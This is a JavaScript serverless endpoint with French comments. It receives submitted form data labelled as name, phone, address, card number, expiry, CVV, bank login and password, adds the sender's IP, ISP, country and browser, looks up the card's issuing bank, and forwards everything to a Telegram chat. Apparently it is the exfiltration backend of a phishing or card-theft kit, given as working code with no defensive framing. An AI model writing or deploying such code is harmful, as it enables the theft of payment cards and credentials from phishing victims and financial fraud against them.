// api/notify.js

const TOKEN        = process.env.TELEGRAM_BOT_TOKEN;
const CHAT         = process.env.TELEGRAM_CHAT_ID;
const IPINFO_TOKEN = process.env.IPINFO_TOKEN || '';

export const config = {
  api: { bodyParser: false },
};

// lit le body (JSON ou texte brut)
async function readBody(req) {
  const contentType = req.headers['content-type'] || '';
  const chunks = [];
  for await (const chunk of req) chunks.push(chunk);
  const raw = Buffer.concat(chunks).toString();
  if (contentType.includes('application/json')) {
    try { return JSON.parse(raw).message || '' }
    catch {}
  }
  return raw;
}

// Geo lookup (ISP + pays)
async function geoLookup(ip) {
  let isp = 'inconnue', country = 'inconnue', countryCode = '';
  // 1) ipinfo.io
  try {
    const r = await fetch(`https://ipinfo.io/${ip}/json${IPINFO_TOKEN?`?token=${IPINFO_TOKEN}`:''}`);
    if (r.ok) {
      const d = await r.json();
      if (d.org)    isp = d.org.replace(/^AS\d+\s+/i,'');
      if (d.country) country = countryCode = d.country;
      return { isp, countryCode, country };
    }
  } catch {}
  // 2) ipwho.is
  try {
    const r = await fetch(`https://ipwho.is/${ip}`);
    const d = await r.json();
    if (d.success) {
      return {
        isp:         d.org        || isp,
        countryCode: d.country_code,
        country:     d.country    || country
      };
    }
  } catch {}
  // 3) ip-api.com
  try {
    const r = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,countryCode,isp`);
    const d = await r.json();
    if (d.status === 'success') {
      return {
        isp:         (d.isp || isp).replace(/^AS\d+\s+/i,''),
        countryCode: d.countryCode,
        country:     d.country    || country
      };
    }
  } catch {}
  return { isp, countryCode, country };
}

// nom complet FR d'un code pays
function fullCountryName(codeOrName) {
  if (!codeOrName) return 'inconnue';
  if (codeOrName.length === 2) {
    try {
      return new Intl.DisplayNames(['fr'],{type:'region'}).of(codeOrName);
    } catch {}
  }
  return codeOrName;
}

// lookup BIN
async function getBinInfo(bin8) {
  try {
    const res = await fetch(
      `https://lookup.binlist.net/${bin8}`,
      { headers: { 'Accept-Version': '3' } }
    );
    if (!res.ok) return null;
    const d = await res.json();
    return {
      scheme:  d.scheme       || '?',
      type:    (d.type || '?').replace(/^./, s => s.toUpperCase()),
      brand:   d.brand        || '?',
      prepaid: d.prepaid ? 'Yes' : 'No',
      country: `${d.country?.emoji||''} ${d.country?.name||'?'}`,
      bank:    d.bank?.name   || '?'
    };
  } catch {
    return null;
  }
}

// mapping scheme → logo (jsdelivr payment-icons)
const CARD_LOGOS = {
  visa:         'https://cdn.jsdelivr.net/npm/payment-icons@1.5.0/icons/visa.svg',
  mastercard:   'https://cdn.jsdelivr.net/npm/payment-icons@1.5.0/icons/mastercard.svg',
  'american-express': 'https://cdn.jsdelivr.net/npm/payment-icons@1.5.0/icons/amex.svg',
  // ajoute d’autres si besoin…
};

export default async function handler(req, res) {
  // CORS pré‐flight
  res.setHeader('Access-Control-Allow-Origin','*');
  res.setHeader('Access-Control-Allow-Methods','POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers','Content-Type');
  if (req.method === 'OPTIONS') return res.status(200).end();

  // Seul POST
  if (req.method !== 'POST') {
    res.setHeader('Allow','POST, OPTIONS');
    return res.status(405).json({ error: 'Method Not Allowed' });
  }

  // Lecture du message
  const rawMsg = (await readBody(req)).trim();
  if (!rawMsg) return res.status(400).json({ error: 'Missing message' });

  // IP + User-Agent
  const forwarded = req.headers['x-forwarded-for'];
  const ip        = forwarded ? forwarded.split(',')[0] : req.socket.remoteAddress || 'inconnue';
  const ua        = req.headers['user-agent'] || 'inconnu';

  // Geo lookup
  const { isp, countryCode, country } = await geoLookup(ip);
  const countryDisplay = fullCountryName(country || countryCode);

  // Date & heure FR
  const now  = new Date();
  const date = now.toLocaleDateString('fr-FR',{day:'2-digit',month:'2-digit',year:'2-digit'});
  const time = now.toLocaleTimeString('fr-FR',{hour:'2-digit',minute:'2-digit',second:'2-digit'});

  // Mapping icônes pour ton corps de message
  const iconMap = {
    étape:'📣', nom:'👤', prénom:'🙋', téléphone:'📞',
    email:'✉️', adresse:'🏠', carte:'💳', numéro:'🔢',
    exp:'📅', expiration:'📅', cvv:'🔒', banque:'🏦',
    id:'🆔', pass:'🔑', password:'🔑'
  };

  // Construction du texte de base
  const lines = rawMsg.split('\n').map(l=>l.trim()).filter(Boolean);
  let text = '';
  for (const line of lines) {
    const low = line.toLowerCase();
    const key = Object.keys(iconMap).find(k=>low.startsWith(k));
    text += (key? iconMap[key]+' ':'') + line + '\n';
  }

  // Infos système
  text += `\n🗓️ Date & heure : ${date}, ${time}\n`
       + `🌐 IP Client     : ${ip}\n`
       + `🔎 ISP Client    : ${isp}\n`
       + `🌍 Pays Client   : ${countryDisplay}\n`
       + `📍 User-Agent    : ${ua}\n`
       + `©️ ${now.getFullYear()} ©️`;

  // Extraction de la ligne "Numéro:" pour le BIN
  const cardLine = lines.find(l => /numéro/i.test(l));
  let photoUrl;
  if (cardLine) {
    const digits = cardLine.replace(/\D/g,'');
    if (digits.length >= 8) {
      const bin8 = digits.slice(0,8);
      const info = await getBinInfo(bin8);
      if (info) {
        // Ligne unique pour tout le BIN Lookup
        const binLine = `🏷️${info.scheme} | 🔖${info.type} | 💳${info.brand} | 💰${info.prepaid} | 🌍${info.country} | 🏦${info.bank}`;
        text += `\n💳 BIN Lookup: ${binLine}`;

        // prépare l'URL du logo si on connaît le scheme
        photoUrl = CARD_LOGOS[info.scheme.toLowerCase()];
      }
    }
  }

  // Envoi sur Telegram
  let tgResponse;
  if (photoUrl) {
    // 1) on envoie la photo + légende
    tgResponse = await fetch(
      `https://api.telegram.org/bot${TOKEN}/sendPhoto`,
      {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
          chat_id: CHAT,
          photo: photoUrl,
          caption: text,
          disable_web_page_preview: true
        })
      }
    );
  } else {
    // fallback : simple message
    tgResponse = await fetch(
      `https://api.telegram.org/bot${TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: {'Content-Type':'application/json'},
        body: JSON.stringify({
          chat_id: CHAT,
          text,
          disable_web_page_preview: true
        })
      }
    );
  }
  const raw = await tgResponse.text();
  return res
    .status(tgResponse.ok ? 200 : tgResponse.status)
    .json({ ok: tgResponse.ok, full: raw });
}